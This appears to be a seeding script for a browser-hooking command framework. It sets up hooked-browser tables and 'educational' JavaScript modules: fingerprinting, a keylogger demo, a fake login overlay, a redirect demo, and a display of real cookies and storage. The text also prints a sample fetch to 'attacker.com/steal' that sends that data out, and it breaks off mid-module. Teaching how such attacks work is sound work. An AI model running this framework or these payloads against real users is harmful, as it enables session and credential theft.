import { Pool } from '@neondatabase/serverless';
import { drizzle } from 'drizzle-orm/neon-serverless';
import { migrate } from 'drizzle-orm/neon-serverless/migrator';
import * as schema from '../shared/schema';
import { 
  commandModules, 
  type InsertCommandModule 
} from '../shared/schema';

// Connect to the database
console.log('Connecting to database...');
if (!process.env.DATABASE_URL) {
  throw new Error('DATABASE_URL environment variable is not set');
}

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const db = drizzle(pool, { schema });

async function pushSchema() {
  try {
    console.log('Pushing schema to database...');
    
    // Create tables if they don't exist based on our Drizzle schema
    await db.execute(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username TEXT NOT NULL UNIQUE,
        password_hash TEXT NOT NULL
      );
      
      CREATE TABLE IF NOT EXISTS hooked_browsers (
        id SERIAL PRIMARY KEY,
        session_id TEXT NOT NULL UNIQUE,
        ip_address TEXT NOT NULL,
        user_agent TEXT NOT NULL,
        browser TEXT,
        browser_version TEXT,
        os TEXT,
        platform TEXT,
        is_online BOOLEAN DEFAULT TRUE,
        first_seen TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        last_seen TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        is_active BOOLEAN DEFAULT TRUE,
        page_uri TEXT,
        page_title TEXT,
        headers JSONB
      );
      
      CREATE TABLE IF NOT EXISTS command_modules (
        id SERIAL PRIMARY KEY,
        name TEXT NOT NULL,
        description TEXT,
        category TEXT NOT NULL,
        icon TEXT,
        code TEXT NOT NULL
      );
      
      CREATE TABLE IF NOT EXISTS command_executions (
        id SERIAL PRIMARY KEY,
        browser_id INTEGER NOT NULL REFERENCES hooked_browsers(id) ON DELETE CASCADE,
        module_id INTEGER NOT NULL REFERENCES command_modules(id) ON DELETE CASCADE,
        status TEXT NOT NULL,
        executed_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        result JSONB
      );
      
      CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        browser_id INTEGER REFERENCES hooked_browsers(id) ON DELETE SET NULL,
        event TEXT NOT NULL,
        level TEXT NOT NULL,
        timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        details JSONB
      );
    `);

    // Initialize default command modules
    await initializeDefaultCommandModules();
    
    console.log('Schema pushed successfully');
  } catch (error) {
    console.error('Failed to push schema:', error);
    throw error;
  } finally {
    await pool.end();
  }
}

// Initialize default command modules if they don't exist
async function initializeDefaultCommandModules() {
  try {
    // Check if command modules already exist
    const existingModules = await db.select().from(commandModules);
    
    if (existingModules.length === 0) {
      console.log('Initializing default command modules...');
      
      const defaultModules: InsertCommandModule[] = [
        {
          name: 'Get Browser Details',
          description: 'Retrieve detailed information about the hooked browser',
          category: 'Information Gathering',
          icon: 'info',
          code: `
            (() => {
              // Educational demonstration only
              const browserInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                screen: {
                  width: screen.width,
                  height: screen.height,
                  availWidth: screen.availWidth,
                  availHeight: screen.availHeight,
                  colorDepth: screen.colorDepth,
                  pixelDepth: screen.pixelDepth
                }
              };
              return browserInfo;
            })();
          `
        },
        {
          name: 'Get Installed Plugins',
          description: 'List all browser plugins and extensions',
          category: 'Information Gathering',
          icon: 'info',
          code: `
            (() => {
              // Educational demonstration only
              const plugins = [];
              if (navigator.plugins) {
                for(let i = 0; i < navigator.plugins.length; i++) {
                  const plugin = navigator.plugins[i];
                  plugins.push({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename
                  });
                }
              }
              return { plugins };
            })();
          `
        },
        {
          name: 'Get System Information',
          description: 'Gather information about the system running the browser',
          category: 'Information Gathering',
          icon: 'info',
          code: `
            (() => {
              // Educational demonstration only
              return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenResolution: {
                  width: screen.width,
                  height: screen.height
                },
                colorDepth: screen.colorDepth,
                devicePixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                cores: navigator.hardwareConcurrency || 'unknown'
              };
            })();
          `
        },
        {
          name: 'Keystroke Logger (Educational)',
          description: 'Demonstrate how keystroke logging works in a controlled environment',
          category: 'Information Gathering',
          icon: 'keyboard',
          code: `
            (() => {
              // Educational demonstration only
              let keystrokes = [];
              let isLogging = false;
              
              // Create UI elements
              const loggerDiv = document.createElement('div');
              loggerDiv.id = 'xss-keylogger-demo';
              loggerDiv.style.position = 'fixed';
              loggerDiv.style.bottom = '20px';
              loggerDiv.style.right = '20px';
              loggerDiv.style.width = '300px';
              loggerDiv.style.padding = '15px';
              loggerDiv.style.backgroundColor = '#f8f9fa';
              loggerDiv.style.border = '1px solid #ddd';
              loggerDiv.style.borderRadius = '5px';
              loggerDiv.style.boxShadow = '0 0 10px rgba(0,0,0,0.1)';
              loggerDiv.style.zIndex = '9999';
              loggerDiv.style.fontFamily = 'Arial, sans-serif';
              
              const demoBanner = document.createElement('div');
              demoBanner.style.marginBottom = '10px';
              demoBanner.style.fontWeight = 'bold';
              demoBanner.style.color = '#721c24';
              demoBanner.style.backgroundColor = '#f8d7da';
              demoBanner.style.padding = '5px';
              demoBanner.style.borderRadius = '3px';
              demoBanner.style.textAlign = 'center';
              demoBanner.textContent = 'EDUCATIONAL KEYSTROKE LOGGER DEMO';
              loggerDiv.appendChild(demoBanner);
              
              const buttonContainer = document.createElement('div');
              buttonContainer.style.marginBottom = '10px';
              
              const startButton = document.createElement('button');
              startButton.id = 'start-logging';
              startButton.style.padding = '5px 10px';
              startButton.style.background = '#28a745';
              startButton.style.color = 'white';
              startButton.style.border = 'none';
              startButton.style.borderRadius = '3px';
              startButton.style.cursor = 'pointer';
              startButton.style.marginRight = '5px';
              startButton.textContent = 'Start Demo';
              buttonContainer.appendChild(startButton);
              
              const stopButton = document.createElement('button');
              stopButton.id = 'stop-logging';
              stopButton.style.padding = '5px 10px';
              stopButton.style.background = '#dc3545';
              stopButton.style.color = 'white';
              stopButton.style.border = 'none';
              stopButton.style.borderRadius = '3px';
              stopButton.style.cursor = 'pointer';
              stopButton.style.display = 'none';
              stopButton.textContent = 'Stop Demo';
              buttonContainer.appendChild(stopButton);
              
              loggerDiv.appendChild(buttonContainer);
              
              const inputLabel = document.createElement('div');
              inputLabel.style.fontSize = '12px';
              inputLabel.style.marginBottom = '10px';
              inputLabel.textContent = 'Type in the field below to see keylogging in action:';
              loggerDiv.appendChild(inputLabel);
              
              const demoInput = document.createElement('input');
              demoInput.id = 'demo-input';
              demoInput.type = 'text';
              demoInput.style.width = '100%';
              demoInput.style.padding = '5px';
              demoInput.style.marginBottom = '10px';
              demoInput.style.border = '1px solid #ced4da';
              demoInput.style.borderRadius = '3px';
              demoInput.placeholder = 'Type here...';
              loggerDiv.appendChild(demoInput);
              
              const logLabel = document.createElement('div');
              logLabel.style.fontSize = '12px';
              logLabel.style.marginBottom = '5px';
              logLabel.textContent = 'Captured keystrokes:';
              loggerDiv.appendChild(logLabel);
              
              const keystrokeLog = document.createElement('div');
              keystrokeLog.id = 'keystroke-log';
              keystrokeLog.style.height = '100px';
              keystrokeLog.style.overflowY = 'auto';
              keystrokeLog.style.border = '1px solid #ced4da';
              keystrokeLog.style.padding = '5px';
              keystrokeLog.style.fontFamily = 'monospace';
              keystrokeLog.style.fontSize = '12px';
              keystrokeLog.style.background = '#f5f5f5';
              keystrokeLog.textContent = 'Click "Start Demo" to begin...';
              loggerDiv.appendChild(keystrokeLog);
              
              const disclaimer = document.createElement('div');
              disclaimer.style.fontSize = '11px';
              disclaimer.style.marginTop = '10px';
              disclaimer.style.color = '#6c757d';
              disclaimer.textContent = 'For educational purposes only. In real-world attacks, this would happen invisibly.';
              loggerDiv.appendChild(disclaimer);
              
              document.body.appendChild(loggerDiv);
              
              // Set up event handlers
              startButton.addEventListener('click', function() {
                startButton.style.display = 'none';
                stopButton.style.display = 'inline-block';
                keystrokeLog.innerHTML = 'Logging started...<br>';
                keystrokes = [];
                isLogging = true;
              });
              
              stopButton.addEventListener('click', function() {
                stopButton.style.display = 'none';
                startButton.style.display = 'inline-block';
                isLogging = false;
                keystrokeLog.innerHTML += '<br>Logging stopped.<br>';
              });
              
              // Set up the keylogger
              function handleKeyPress(e) {
                if (!isLogging) return;
                
                const key = e.key;
                const target = e.target.tagName;
                const timestamp = new Date().toLocaleTimeString();
                
                keystrokes.push({key, target, timestamp});
                
                keystrokeLog.innerHTML += '[' + timestamp + '] ' + key + '<br>';
                keystrokeLog.scrollTop = keystrokeLog.scrollHeight;
              }
              
              // Only log keys from the demo input to be ethical
              demoInput.addEventListener('keydown', handleKeyPress);
              
              return { success: true, message: 'Keystroke logger demonstration activated' };
            })();
          `
        },
        {
          name: 'Fake Login Phishing Demo',
          description: 'Demonstrate how phishing attacks can steal credentials',
          category: 'Social Engineering',
          icon: 'login',
          code: `
            (() => {
              // Educational demonstration only
              // Create a fake login overlay
              const overlay = document.createElement('div');
              overlay.style.position = 'fixed';
              overlay.style.top = '0';
              overlay.style.left = '0';
              overlay.style.width = '100%';
              overlay.style.height = '100%';
              overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
              overlay.style.zIndex = '10000';
              overlay.style.display = 'flex';
              overlay.style.justifyContent = 'center';
              overlay.style.alignItems = 'center';
              overlay.style.fontFamily = 'Arial, sans-serif';
              
              // Create the phishing form
              const formBox = document.createElement('div');
              formBox.style.width = '350px';
              formBox.style.padding = '20px';
              formBox.style.backgroundColor = 'white';
              formBox.style.borderRadius = '5px';
              formBox.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
              
              // Create educational banner
              const banner = document.createElement('div');
              banner.style.backgroundColor = '#f8d7da';
              banner.style.padding = '10px';
              banner.style.marginBottom = '15px';
              banner.style.borderRadius = '3px';
              banner.style.textAlign = 'center';
              const bannerText = document.createElement('strong');
              bannerText.style.color = '#721c24';
              bannerText.textContent = 'EDUCATIONAL PHISHING DEMO';
              banner.appendChild(bannerText);
              
              const bannerSubtext = document.createElement('p');
              bannerSubtext.style.fontSize = '12px';
              bannerSubtext.style.margin = '5px 0 0 0';
              bannerSubtext.textContent = 'This is a demonstration of how phishing attacks work.';
              banner.appendChild(bannerSubtext);
              
              const bannerDisclaimer = document.createElement('p');
              bannerDisclaimer.style.fontSize = '12px';
              bannerDisclaimer.style.margin = '5px 0 0 0';
              bannerDisclaimer.textContent = 'No information is being sent to any server.';
              banner.appendChild(bannerDisclaimer);
              
              formBox.appendChild(banner);
              
              // Create title
              const title = document.createElement('h2');
              title.style.marginTop = '0';
              title.style.color = '#333';
              title.style.textAlign = 'center';
              title.textContent = 'Session Expired';
              formBox.appendChild(title);
              
              const subtitle = document.createElement('p');
              subtitle.style.color = '#666';
              subtitle.style.marginBottom = '20px';
              subtitle.textContent = 'Please re-enter your credentials to continue.';
              formBox.appendChild(subtitle);
              
              // Create form
              const form = document.createElement('form');
              form.id = 'fake-login-form';
              
              // Username field
              const usernameGroup = document.createElement('div');
              usernameGroup.style.marginBottom = '15px';
              
              const userLabel = document.createElement('label');
              userLabel.style.display = 'block';
              userLabel.style.marginBottom = '5px';
              userLabel.style.color = '#333';
              userLabel.textContent = 'Username or Email';
              usernameGroup.appendChild(userLabel);
              
              const userInput = document.createElement('input');
              userInput.type = 'text';
              userInput.id = 'fake-username';
              userInput.style.width = '100%';
              userInput.style.padding = '8px';
              userInput.style.border = '1px solid #ddd';
              userInput.style.borderRadius = '3px';
              userInput.placeholder = 'Enter your username';
              usernameGroup.appendChild(userInput);
              
              form.appendChild(usernameGroup);
              
              // Password field
              const passwordGroup = document.createElement('div');
              passwordGroup.style.marginBottom = '20px';
              
              const pwdLabel = document.createElement('label');
              pwdLabel.style.display = 'block';
              pwdLabel.style.marginBottom = '5px';
              pwdLabel.style.color = '#333';
              pwdLabel.textContent = 'Password';
              passwordGroup.appendChild(pwdLabel);
              
              const pwdInput = document.createElement('input');
              pwdInput.type = 'password';
              pwdInput.id = 'fake-password';
              pwdInput.style.width = '100%';
              pwdInput.style.padding = '8px';
              pwdInput.style.border = '1px solid #ddd';
              pwdInput.style.borderRadius = '3px';
              pwdInput.placeholder = 'Enter your password';
              passwordGroup.appendChild(pwdInput);
              
              form.appendChild(passwordGroup);
              
              // Buttons
              const btnGroup = document.createElement('div');
              btnGroup.style.display = 'flex';
              btnGroup.style.justifyContent = 'space-between';
              btnGroup.style.alignItems = 'center';
              
              const loginBtn = document.createElement('button');
              loginBtn.type = 'submit';
              loginBtn.style.backgroundColor = '#0066cc';
              loginBtn.style.color = 'white';
              loginBtn.style.border = 'none';
              loginBtn.style.padding = '10px 15px';
              loginBtn.style.borderRadius = '3px';
              loginBtn.style.cursor = 'pointer';
              loginBtn.textContent = 'Login';
              btnGroup.appendChild(loginBtn);
              
              const closeBtn = document.createElement('button');
              closeBtn.id = 'demo-close';
              closeBtn.type = 'button';
              closeBtn.style.backgroundColor = '#dc3545';
              closeBtn.style.color = 'white';
              closeBtn.style.border = 'none';
              closeBtn.style.padding = '10px 15px';
              closeBtn.style.borderRadius = '3px';
              closeBtn.style.cursor = 'pointer';
              closeBtn.textContent = 'Close Demo';
              btnGroup.appendChild(closeBtn);
              
              form.appendChild(btnGroup);
              
              formBox.appendChild(form);
              
              // Footer
              const footer = document.createElement('p');
              footer.style.fontSize = '11px';
              footer.style.color = '#999';
              footer.style.marginTop = '20px';
              footer.style.textAlign = 'center';
              footer.textContent = 'For educational purposes only.';
              formBox.appendChild(footer);
              
              overlay.appendChild(formBox);
              document.body.appendChild(overlay);
              
              // Captured credentials (for educational purposes only)
              let capturedCredentials = null;
              
              // Event handlers
              form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = userInput.value;
                const password = pwdInput.value;
                
                // Store credentials (for demonstration only)
                capturedCredentials = { username, password };
                
                // Show captured credentials
                formBox.innerHTML = '';
                
                // Recreate educational banner
                const resultBanner = document.createElement('div');
                resultBanner.style.backgroundColor = '#f8d7da';
                resultBanner.style.padding = '10px';
                resultBanner.style.marginBottom = '15px';
                resultBanner.style.borderRadius = '3px';
                resultBanner.style.textAlign = 'center';
                
                const resultBannerText = document.createElement('strong');
                resultBannerText.style.color = '#721c24';
                resultBannerText.textContent = 'EDUCATIONAL PHISHING DEMO';
                resultBanner.appendChild(resultBannerText);
                formBox.appendChild(resultBanner);
                
                // Results title
                const resultTitle = document.createElement('h2');
                resultTitle.style.marginTop = '0';
                resultTitle.style.color = '#333';
                resultTitle.style.textAlign = 'center';
                resultTitle.textContent = 'Phishing Demonstration';
                formBox.appendChild(resultTitle);
                
                // Results description
                const resultDesc = document.createElement('p');
                resultDesc.style.color = '#666';
                resultDesc.style.marginBottom = '10px';
                resultDesc.textContent = 'In a real attack, the following credentials would have been sent to an attacker:';
                formBox.appendChild(resultDesc);
                
                // Results data
                const resultData = document.createElement('div');
                resultData.style.backgroundColor = '#f5f5f5';
                resultData.style.padding = '10px';
                resultData.style.borderRadius = '3px';
                resultData.style.fontFamily = 'monospace';
                resultData.style.marginBottom = '20px';
                
                const userResult = document.createElement('p');
                userResult.style.margin = '5px 0';
                userResult.innerHTML = '<strong>Username:</strong> ' + username;
                resultData.appendChild(userResult);
                
                const pwdResult = document.createElement('p');
                pwdResult.style.margin = '5px 0';
                pwdResult.innerHTML = '<strong>Password:</strong> ' + password;
                resultData.appendChild(pwdResult);
                
                formBox.appendChild(resultData);
                
                // Explanation
                const explanation = document.createElement('p');
                explanation.style.color = '#666';
                explanation.style.marginBottom = '20px';
                explanation.textContent = 'This is how easily credentials can be stolen through phishing attacks.';
                formBox.appendChild(explanation);
                
                // Close button
                const closeBtn2 = document.createElement('button');
                closeBtn2.id = 'demo-close2';
                closeBtn2.style.backgroundColor = '#dc3545';
                closeBtn2.style.color = 'white';
                closeBtn2.style.border = 'none';
                closeBtn2.style.padding = '10px 15px';
                closeBtn2.style.borderRadius = '3px';
                closeBtn2.style.cursor = 'pointer';
                closeBtn2.style.width = '100%';
                closeBtn2.textContent = 'Close Demo';
                formBox.appendChild(closeBtn2);
                
                // Footer
                const footer2 = document.createElement('p');
                footer2.style.fontSize = '11px';
                footer2.style.color = '#999';
                footer2.style.marginTop = '20px';
                footer2.style.textAlign = 'center';
                footer2.textContent = 'For educational purposes only.';
                formBox.appendChild(footer2);
                
                closeBtn2.addEventListener('click', function() {
                  document.body.removeChild(overlay);
                });
              });
              
              closeBtn.addEventListener('click', function() {
                document.body.removeChild(overlay);
              });
              
              return { success: true, message: 'Phishing demonstration activated' };
            })();
          `
        },
        {
          name: 'Page Redirect Demo',
          description: 'Demonstrate how XSS can be used to redirect users to other websites',
          category: 'Social Engineering',
          icon: 'link',
          code: `
            (() => {
              // Educational demonstration only
              const overlay = document.createElement('div');
              overlay.style.position = 'fixed';
              overlay.style.top = '0';
              overlay.style.left = '0';
              overlay.style.width = '100%';
              overlay.style.height = '100%';
              overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
              overlay.style.zIndex = '10000';
              overlay.style.display = 'flex';
              overlay.style.justifyContent = 'center';
              overlay.style.alignItems = 'center';
              overlay.style.fontFamily = 'Arial, sans-serif';
              
              const dialogBox = document.createElement('div');
              dialogBox.style.width = '400px';
              dialogBox.style.padding = '20px';
              dialogBox.style.backgroundColor = 'white';
              dialogBox.style.borderRadius = '5px';
              dialogBox.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
              
              // Create educational banner
              const banner = document.createElement('div');
              banner.style.backgroundColor = '#f8d7da';
              banner.style.padding = '10px';
              banner.style.marginBottom = '15px';
              banner.style.borderRadius = '3px';
              banner.style.textAlign = 'center';
              
              const bannerText = document.createElement('strong');
              bannerText.style.color = '#721c24';
              bannerText.textContent = 'EDUCATIONAL REDIRECT DEMO';
              banner.appendChild(bannerText);
              
              const bannerDesc = document.createElement('p');
              bannerDesc.style.fontSize = '12px';
              bannerDesc.style.margin = '5px 0 0 0';
              bannerDesc.textContent = 'This demonstrates how XSS can redirect users.';
              banner.appendChild(bannerDesc);
              
              dialogBox.appendChild(banner);
              
              // Title
              const title = document.createElement('h2');
              title.style.marginTop = '0';
              title.style.color = '#333';
              title.style.textAlign = 'center';
              title.textContent = 'Demonstration: Page Redirection';
              dialogBox.appendChild(title);
              
              // Description
              const desc1 = document.createElement('p');
              desc1.style.color = '#666';
              desc1.style.marginBottom = '15px';
              desc1.textContent = 'In a real XSS attack, the attacker could redirect you to:';
              dialogBox.appendChild(desc1);
              
              // List of redirect purposes
              const list = document.createElement('ul');
              list.style.color = '#666';
              list.style.marginBottom = '15px';
              
              const items = [
                'A phishing site that looks identical to the real site',
                'A malware download page',
                'A site that attempts to exploit browser vulnerabilities'
              ];
              
              items.forEach(item => {
                const li = document.createElement('li');
                li.textContent = item;
                list.appendChild(li);
              });
              
              dialogBox.appendChild(list);
              
              // Final description
              const desc2 = document.createElement('p');
              desc2.style.color = '#666';
              desc2.style.marginBottom = '20px';
              desc2.textContent = 'Instead of actually redirecting you, this demo just shows you what could happen.';
              dialogBox.appendChild(desc2);
              
              // Buttons
              const btnContainer = document.createElement('div');
              btnContainer.style.display = 'flex';
              btnContainer.style.justifyContent = 'space-between';
              
              const simulateBtn = document.createElement('button');
              simulateBtn.id = 'simulate-redirect';
              simulateBtn.style.backgroundColor = '#0066cc';
              simulateBtn.style.color = 'white';
              simulateBtn.style.border = 'none';
              simulateBtn.style.padding = '10px 15px';
              simulateBtn.style.borderRadius = '3px';
              simulateBtn.style.cursor = 'pointer';
              simulateBtn.textContent = 'Simulate Redirect';
              btnContainer.appendChild(simulateBtn);
              
              const closeBtn = document.createElement('button');
              closeBtn.id = 'redirect-close';
              closeBtn.style.backgroundColor = '#dc3545';
              closeBtn.style.color = 'white';
              closeBtn.style.border = 'none';
              closeBtn.style.padding = '10px 15px';
              closeBtn.style.borderRadius = '3px';
              closeBtn.style.cursor = 'pointer';
              closeBtn.textContent = 'Close Demo';
              btnContainer.appendChild(closeBtn);
              
              dialogBox.appendChild(btnContainer);
              
              // Footer
              const footer = document.createElement('p');
              footer.style.fontSize = '11px';
              footer.style.color = '#999';
              footer.style.marginTop = '20px';
              footer.style.textAlign = 'center';
              footer.textContent = 'For educational purposes only.';
              dialogBox.appendChild(footer);
              
              overlay.appendChild(dialogBox);
              document.body.appendChild(overlay);
              
              // Simulate redirect
              simulateBtn.addEventListener('click', function() {
                dialogBox.innerHTML = '';
                
                // Recreate educational banner
                const resultBanner = document.createElement('div');
                resultBanner.style.backgroundColor = '#f8d7da';
                resultBanner.style.padding = '10px';
                resultBanner.style.marginBottom = '15px';
                resultBanner.style.borderRadius = '3px';
                resultBanner.style.textAlign = 'center';
                
                const resultBannerText = document.createElement('strong');
                resultBannerText.style.color = '#721c24';
                resultBannerText.textContent = 'EDUCATIONAL REDIRECT DEMO';
                resultBanner.appendChild(resultBannerText);
                dialogBox.appendChild(resultBanner);
                
                // New title
                const resultTitle = document.createElement('h2');
                resultTitle.style.marginTop = '0';
                resultTitle.style.color = '#333';
                resultTitle.style.textAlign = 'center';
                resultTitle.textContent = 'Redirect Simulated';
                dialogBox.appendChild(resultTitle);
                
                // Description
                const resultDesc = document.createElement('p');
                resultDesc.style.color = '#666';
                resultDesc.style.marginBottom = '15px';
                resultDesc.textContent = 'In a real attack, your browser would now be at:';
                dialogBox.appendChild(resultDesc);
                
                // Fake URL
                const urlBox = document.createElement('div');
                urlBox.style.backgroundColor = '#f5f5f5';
                urlBox.style.padding = '10px';
                urlBox.style.borderRadius = '3px';
                urlBox.style.fontFamily = 'monospace';
                urlBox.style.marginBottom = '20px';
                urlBox.style.wordBreak = 'break-all';
                
                const urlText = document.createElement('p');
                urlText.style.margin = '5px 0';
                urlText.textContent = 'https://malicious-site.example.com/fake-login';
                urlBox.appendChild(urlText);
                
                dialogBox.appendChild(urlBox);
                
                // Code explanation
                const codeDesc = document.createElement('p');
                codeDesc.style.color = '#666';
                codeDesc.style.marginBottom = '20px';
                codeDesc.textContent = 'The code for this would be as simple as:';
                dialogBox.appendChild(codeDesc);
                
                // Code example
                const codeBox = document.createElement('pre');
                codeBox.style.backgroundColor = '#f5f5f5';
                codeBox.style.padding = '10px';
                codeBox.style.borderRadius = '3px';
                codeBox.style.fontFamily = 'monospace';
                codeBox.style.marginBottom = '20px';
                codeBox.style.overflowX = 'auto';
                codeBox.textContent = 'window.location = "https://malicious-site.example.com";';
                dialogBox.appendChild(codeBox);
                
                // Close button
                const closeBtn2 = document.createElement('button');
                closeBtn2.id = 'redirect-close2';
                closeBtn2.style.backgroundColor = '#dc3545';
                closeBtn2.style.color = 'white';
                closeBtn2.style.border = 'none';
                closeBtn2.style.padding = '10px 15px';
                closeBtn2.style.borderRadius = '3px';
                closeBtn2.style.cursor = 'pointer';
                closeBtn2.style.width = '100%';
                closeBtn2.textContent = 'Close Demo';
                dialogBox.appendChild(closeBtn2);
                
                // Footer
                const footer2 = document.createElement('p');
                footer2.style.fontSize = '11px';
                footer2.style.color = '#999';
                footer2.style.marginTop = '20px';
                footer2.style.textAlign = 'center';
                footer2.textContent = 'For educational purposes only.';
                dialogBox.appendChild(footer2);
                
                closeBtn2.addEventListener('click', function() {
                  document.body.removeChild(overlay);
                });
              });
              
              closeBtn.addEventListener('click', function() {
                document.body.removeChild(overlay);
              });
              
              return { success: true, message: 'Redirect demonstration activated' };
            })();
          `
        },
        {
          name: 'Token Stealing Demo',
          description: 'Demonstrate how XSS can be used to steal authentication tokens',
          category: 'Information Gathering',
          icon: 'key',
          code: `
            (() => {
              // Educational demonstration only
              // Create UI for demonstration
              const overlay = document.createElement('div');
              overlay.style.position = 'fixed';
              overlay.style.top = '0';
              overlay.style.left = '0';
              overlay.style.width = '100%';
              overlay.style.height = '100%';
              overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
              overlay.style.zIndex = '10000';
              overlay.style.display = 'flex';
              overlay.style.justifyContent = 'center';
              overlay.style.alignItems = 'center';
              overlay.style.fontFamily = 'Arial, sans-serif';
              
              const dialogBox = document.createElement('div');
              dialogBox.style.width = '450px';
              dialogBox.style.padding = '20px';
              dialogBox.style.backgroundColor = 'white';
              dialogBox.style.borderRadius = '5px';
              dialogBox.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
              dialogBox.style.maxHeight = '80vh';
              dialogBox.style.overflowY = 'auto';
              
              // Educational banner
              const banner = document.createElement('div');
              banner.style.backgroundColor = '#f8d7da';
              banner.style.padding = '10px';
              banner.style.marginBottom = '15px';
              banner.style.borderRadius = '3px';
              banner.style.textAlign = 'center';
              
              const bannerText = document.createElement('strong');
              bannerText.style.color = '#721c24';
              bannerText.textContent = 'EDUCATIONAL TOKEN STEALING DEMO';
              banner.appendChild(bannerText);
              
              const bannerDesc = document.createElement('p');
              bannerDesc.style.fontSize = '12px';
              bannerDesc.style.margin = '5px 0 0 0';
              bannerDesc.textContent = 'This demonstrates how sensitive data can be accessed.';
              banner.appendChild(bannerDesc);
              
              dialogBox.appendChild(banner);
              
              // Title
              const title = document.createElement('h2');
              title.style.marginTop = '0';
              title.style.color = '#333';
              title.style.textAlign = 'center';
              title.textContent = 'Token/Cookie Stealing';
              dialogBox.appendChild(title);
              
              // Description
              const desc = document.createElement('p');
              desc.style.color = '#666';
              desc.style.marginBottom = '15px';
              desc.textContent = 'In a real XSS attack, sensitive data like authentication tokens stored in cookies or localStorage could be stolen.';
              dialogBox.appendChild(desc);
              
              // Get actual cookies for demonstration
              const cookies = document.cookie;
              
              // Try to get storage items safely
              let localStorageItems = {};
              let sessionStorageItems = {};
              
              try {
                for (let i = 0; i < localStorage.length; i++) {
                  const key = localStorage.key(i);
                  localStorageItems[key] = localStorage.getItem(key);
                }
              } catch (e) {
                localStorageItems = { error: 'Cannot access localStorage' };
              }
              
              try {
                for (let i = 0; i < sessionStorage.length; i++) {
                  const key = sessionStorage.key(i);
                  sessionStorageItems[key] = sessionStorage.getItem(key);
                }
              } catch (e) {
                sessionStorageItems = { error: 'Cannot access sessionStorage' };
              }
              
              // Format storage for display
              function formatStorage(storage) {
                if (Object.keys(storage).length === 0) {
                  return '(empty)';
                }
                let result = '';
                for (const key in storage) {
                  result += '<div style="margin-bottom:5px;">';
                  result += '<strong>' + key + ':</strong> ' + storage[key];
                  result += '</div>';
                }
                return result;
              }
              
              // Cookies section
              const cookiesTitle = document.createElement('h3');
              cookiesTitle.style.color = '#333';
              cookiesTitle.style.marginTop = '20px';
              cookiesTitle.textContent = 'Your Cookies:';
              dialogBox.appendChild(cookiesTitle);
              
              const cookiesBox = document.createElement('div');
              cookiesBox.style.backgroundColor = '#f5f5f5';
              cookiesBox.style.padding = '10px';
              cookiesBox.style.borderRadius = '3px';
              cookiesBox.style.fontFamily = 'monospace';
              cookiesBox.style.marginBottom = '20px';
              cookiesBox.style.fontSize = '12px';
              cookiesBox.textContent = cookies ? cookies : '(no cookies found)';
              dialogBox.appendChild(cookiesBox);
              
              // localStorage section
              const lsTitle = document.createElement('h3');
              lsTitle.style.color = '#333';
              lsTitle.style.marginTop = '20px';
              lsTitle.textContent = 'Your localStorage:';
              dialogBox.appendChild(lsTitle);
              
              const lsBox = document.createElement('div');
              lsBox.style.backgroundColor = '#f5f5f5';
              lsBox.style.padding = '10px';
              lsBox.style.borderRadius = '3px';
              lsBox.style.fontFamily = 'monospace';
              lsBox.style.marginBottom = '20px';
              lsBox.style.fontSize = '12px';
              lsBox.innerHTML = formatStorage(localStorageItems);
              dialogBox.appendChild(lsBox);
              
              // sessionStorage section
              const ssTitle = document.createElement('h3');
              ssTitle.style.color = '#333';
              ssTitle.style.marginTop = '20px';
              ssTitle.textContent = 'Your sessionStorage:';
              dialogBox.appendChild(ssTitle);
              
              const ssBox = document.createElement('div');
              ssBox.style.backgroundColor = '#f5f5f5';
              ssBox.style.padding = '10px';
              ssBox.style.borderRadius = '3px';
              ssBox.style.fontFamily = 'monospace';
              ssBox.style.marginBottom = '20px';
              ssBox.style.fontSize = '12px';
              ssBox.innerHTML = formatStorage(sessionStorageItems);
              dialogBox.appendChild(ssBox);
              
              // Code explanation
              const codeDesc = document.createElement('p');
              codeDesc.style.color = '#666';
              codeDesc.style.marginBottom = '15px';
              codeDesc.textContent = 'The code to steal this data can be as simple as:';
              dialogBox.appendChild(codeDesc);
              
              // Code example
              const codeBox = document.createElement('pre');
              codeBox.style.backgroundColor = '#f5f5f5';
              codeBox.style.padding = '10px';
              codeBox.style.borderRadius = '3px';
              codeBox.style.fontFamily = 'monospace';
              codeBox.style.marginBottom = '20px';
              codeBox.style.overflowX = 'auto';
              codeBox.style.fontSize = '12px';
              codeBox.textContent = 'fetch("https://attacker.com/steal", {\n  method: "POST",\n  body: JSON.stringify({\n    cookies: document.cookie,\n    localStorage: JSON.stringify(localStorage),\n    sessionStorage: JSON.stringify(sessionStorage)\n  })\n});';
              dialogBox.appendChild(codeBox);
              
              // Close button
              const closeBtn = document.createElement('button');
              closeBtn.id = 'token-close';
              closeBtn.style.backgroundColor = '#dc3545';
              closeBtn.style.color = 'white';
              closeBtn.style.border = 'none';
              closeBtn.style.padding = '10px 15px';
              closeBtn.style.borderRadius = '3px';
              closeBtn.style.cursor = 'pointer';
              closeBtn.style.width = '100%';
              closeBtn.textContent = 'Close Demo';
              dialogBox.appendChild(closeBtn);
              
              // Footer
              const footer = document.createElement('p');
              footer.style.fontSize = '11px';
